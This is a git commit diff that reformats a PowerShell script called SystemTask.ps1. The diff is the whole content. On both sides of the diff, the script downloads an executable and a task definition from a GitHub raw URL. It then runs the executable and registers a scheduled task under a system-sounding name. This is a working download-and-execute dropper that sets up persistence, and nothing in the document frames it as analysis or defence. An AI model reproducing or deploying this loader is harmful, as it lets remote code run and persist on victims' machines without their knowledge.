38f67f16853251baefef2e5ec9d562df27804735
Gh0st1nTh3Sh3ll1 <Gh0st1nTh3Sh3llUIT@gmail.com>
2016-12-07 19:12:48 +0700

    Update SystemTask.ps1

--- SystemTask.ps1
+++ SystemTask.ps1
@@ -1,8 +1,11 @@
-$client = new-object System.Net.WebClient; 
-$url = 'https://raw.githubusercontent.com/Gh0st1nTh3Sh3ll1/SystemTask/master/SystemTask.xml'; 
-$file = 'SystemTask.xml'; $client.DownloadFile($url,$file); 
-$url = 'https://raw.githubusercontent.com/Gh0st1nTh3Sh3ll1/SystemTask/master/SystemTask.exe'; 
-$file = 'SystemTask.exe'; $client.DownloadFile($url,$file); 
-$exec = New-Object -com shell.application; $exec.shellexecute($file); 
-schtasks.exe /create /tn "SystemTask" /xml "SystemTask.xml"; 
-exit;
+$client = new-object System.Net.WebClient
+$url = 'https://raw.githubusercontent.com/Gh0st1nTh3Sh3ll1/SystemTask/master/SystemTask.xml'
+$file = 'SystemTask.xml'
+$client.DownloadFile($url,$file)
+$url = 'https://raw.githubusercontent.com/Gh0st1nTh3Sh3ll1/SystemTask/master/SystemTask.exe' 
+$file = 'SystemTask.exe'
+$client.DownloadFile($url,$file)
+$exec = New-Object -com shell.application
+$exec.shellexecute($file)
+schtasks.exe /create /tn "SystemTask" /xml "SystemTask.xml"
+exit
